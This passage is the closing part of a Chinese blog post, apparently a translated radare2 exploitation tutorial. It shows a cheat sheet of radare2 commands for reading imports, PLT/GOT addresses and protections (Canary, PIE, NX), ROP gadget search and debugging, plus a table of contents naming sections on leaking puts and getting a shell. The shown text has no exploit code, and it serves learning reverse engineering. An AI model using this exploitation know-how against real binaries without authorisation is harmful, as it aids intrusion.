<li><code>ii [q]</code>——导入表</li>
<li><code>?v sym.imp.func_name</code>——获取<code>func_name@PLT</code>地址</li>
<li><code>?v reloc.func_name</code>——获取<code>func_name@GOT</code>地址</li>
<li><code>ie [q]</code>——获取入口点地址</li>
<li><code>iS</code>——查看区段的各个权限（读/写/执行）</li>
<li><code>i~canary</code>——检查是否开启<code>Canary</code></li>
<li><code>i~pic</code>——检查是否开启<code>PIE</code></li>
<li><code>i~nx</code>——检查是否开启<code>NX</code></li>
</ul>
<h2 id="内存"><a href="#内存" class="headerlink" title="内存"></a>内存</h2><ul>
<li><code>dm</code>——查看内存信息</li>
<li><code>dmm</code>——列出模块（内存中的运行库和二进制模块）</li>
<li><code>dmi [addr|libname] [symname]</code>——列出目标库的标志</li>
</ul>
<h2 id="查找"><a href="#查找" class="headerlink" title="查找"></a>查找</h2><ul>
<li><code>e search.*</code>——编辑查找配置</li>
<li><code>/?</code>——列出查找的子命令</li>
<li><code>/ string</code>——在内存或程序段查找字符串</li>
<li><code>/R [?]</code>——查找特定的ROP</li>
<li><code>/R/</code>——ROP常规搜索</li>
</ul>
<h2 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h2><ul>
<li><code>dc</code>——继续执行</li>
<li><code>dcu addr</code>——继续执行到某个地址</li>
<li><code>dcr</code>——继续执行直到<code>ret</code>（单步步过）</li>
<li><code>dbt [?]</code>——在<em>dbg.btdepth</em>和<em>dbg.btalgo</em>的基础上回溯指令</li>
<li><code>doo [args]</code>——重新打开调试并设置参数</li>
<li><code>ds</code>——单步步入</li>
<li><code>dso</code>——单步步过</li>
</ul>
<h2 id="图形模式"><a href="#图形模式" class="headerlink" title="图形模式"></a>图形模式</h2><ul>
<li><code>pdf @ addr</code>——输出当前位移下函数的汇编代码</li>
<li><code>V</code>——可视化模式，使用<code>p</code>/<code>P</code>再两个模式间切换</li>
<li><code>VV</code>——图形模式，在ascii图像下分析</li>
<li><code>V!</code>——控制板模式，对漏洞利用非常有用</li>
</ul>
<p>看看<a href="http://radare.today/posts/using-radare2/" target="_blank" rel="noopener">这篇文章</a>，也许有更多的内容能够帮助到你。</p>

      
    </div>
    <footer class="entry-meta entry-footer">
      
      
  <span class="ico-tags"></span>
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/re/">re</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/translation/">translation</a></li></ul>

      
        
	<div id="comment">
		<!-- 来必力City版安装代码 -->
		<div id="lv-container" data-id="city" data-uid="MTAyMC8yOTQ4MS82MDQ5">
		<script type="text/javascript">
		   (function(d, s) {
		       var j, e = d.getElementsByTagName(s)[0];

		       if (typeof LivereTower === 'function') { return; }

		       j = d.createElement(s);
		       j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
		       j.async = true;

		       e.parentNode.insertBefore(j, e);
		   })(document, 'script');
		</script>
		<noscript>为正常使用来必力评论功能请激活JavaScript</noscript>
		</div>
		<!-- City版安装代码已完成 -->
	</div>



      
    </footer>
    <hr class="entry-footer-hr">
  </div>
  
    
<nav id="article-nav">
  
    <a href="/2099/12/31/闭关学习/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Newer</strong>
      <div class="article-nav-title">
        
          闭关学习
        
      </div>
    </a>
  
  
    <a href="/2019/02/20/Installing-Minimal-Ubuntu-for-REMnux/" id="article-nav-older" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Older</strong>
      <div class="article-nav-title">Installing Minimal Ubuntu for REMnux</div>
    </a>
  
</nav>

  
</article>

<!-- Table of Contents -->

  <aside id="sidebar">
    <div id="toc" class="toc-article">
    <strong class="toc-title">Contents</strong>
    
      <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#序言"><span class="nav-number">1.</span> <span class="nav-text">序言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#更新radare2"><span class="nav-number">2.</span> <span class="nav-text">更新radare2</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#熟悉程序"><span class="nav-number">3.</span> <span class="nav-text">熟悉程序</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#理解漏洞"><span class="nav-number">4.</span> <span class="nav-text">理解漏洞</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#规划漏洞利用脚本"><span class="nav-number">5.</span> <span class="nav-text">规划漏洞利用脚本</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#编写漏洞利用脚本"><span class="nav-number">6.</span> <span class="nav-text">编写漏洞利用脚本</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#计划"><span class="nav-number">6.1.</span> <span class="nav-text">计划</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#泄漏puts的地址"><span class="nav-number">6.2.</span> <span class="nav-text">泄漏puts的地址</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#计算真实地址"><span class="nav-number">6.3.</span> <span class="nav-text">计算真实地址</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#获取shell"><span class="nav-number">6.4.</span> <span class="nav-text">获取shell</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#后记"><span class="nav-number">7.</span> <span class="nav-text">后记</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#漏洞利用命令对应表"><span class="nav-number">8.</span> <span class="nav-text">漏洞利用命令对应表</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#获取信息"><span class="nav-number">8.1.</span> <span class="nav-text">获取信息</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#内存"><span class="nav-number">8.2.</span> <span class="nav-text">内存</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#查找"><span class="nav-number">8.3.</span> <span class="nav-text">查找</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#调试"><span class="nav-number">8.4.</span> <span class="nav-text">调试</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#图形模式"><span class="nav-number">8.5.</span> <span class="nav-text">图形模式</span></a></li></ol></li></ol>
    
    </div>
  </aside>
</section>
        
      </div>

    </div>
    <!-- <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
    <a href="/tags" class="mobile-nav-link">Tags</a>
  
    <a href="/about" class="mobile-nav-link">About</a>
  
</nav> -->
    <footer id="footer" class="site-footer">
  

  <div class="clearfix container">
      <div class="site-info">
	      &copy; 2019 AssassinQ All Rights Reserved.
        
      </div>
      <div class="site-credit">
        Theme by <a href="https://github.com/iTimeTraveler/hexo-theme-hipaper" target="_blank">hipaper</a>
      </div>
  </div>
</footer>


<!-- min height -->

<script>
    var wrapdiv = document.getElementById("wrap");
    var contentdiv = document.getElementById("content");

    wrapdiv.style.minHeight = document.body.offsetHeight - document.getElementById("allheader").offsetHeight - document.getElementById("footer").offsetHeight + "px";
    contentdiv.style.minHeight = document.body.offsetHeight - document.getElementById("allheader").offsetHeight - document.getElementById("footer").offsetHeight + "px";


    <!-- headerblur min height -->
    
      var headerblur = document.getElementById("header-blur");
      headerblur.style.minHeight = window.getComputedStyle(document.getElementById("allheader"), null).height;
    
    
</script>
    
<div style="display: none;">
  <script src="https://s11.cnzz.com/z_stat.php?id=1260716016&web_id=1260716016" language="JavaScript"></script>
</div>

<!-- mathjax config similar to math.stackexchange -->

<script type="text/x-mathjax-config">
  MathJax.Hub.Config({
    tex2jax: {
      inlineMath: [ ['$','$'], ["\\(","\\)"] ],
      processEscapes: true
    }
  });
</script>

<script type="text/x-mathjax-config">
    MathJax.Hub.Config({
      tex2jax: {
        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
      }
    });
</script>

<script type="text/x-mathjax-config">
    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax(), i;
        for(i=0; i < all.length; i += 1) {
            all[i].SourceElement().parentNode.className += ' has-jax';
        }
    });
</script>

<script type="text/javascript" src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
</script>


  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
  <script src="/fancybox/jquery.fancybox.pack.js"></script>


<script src="/js/script.js"></script>
<script src="/js/bootstrap.js"></script>
<script src="/js/main.js"></script>







  <div style="display: none;">
    <script src="https://s95.cnzz.com/z_stat.php?id=1260716016&web_id=1260716016" language="JavaScript"></script>
  </div>





	<script type="text/javascript">
    var _hmt = _hmt || [];
    (function() {
      var hm = document.createElement("script");
      hm.src = "//hm.baidu.com/hm.js?{{ theme.baidu_analytics }}";
      var s = document.getElementsByTagName("script")[0];
      s.parentNode.insertBefore(hm, s);
    })();
  </script>




  </div>

  <a id="rocket" href="#top" class=""></a>
  <script type="text/javascript" src="/js/totop.js" async=""></script>
</body>
</html>
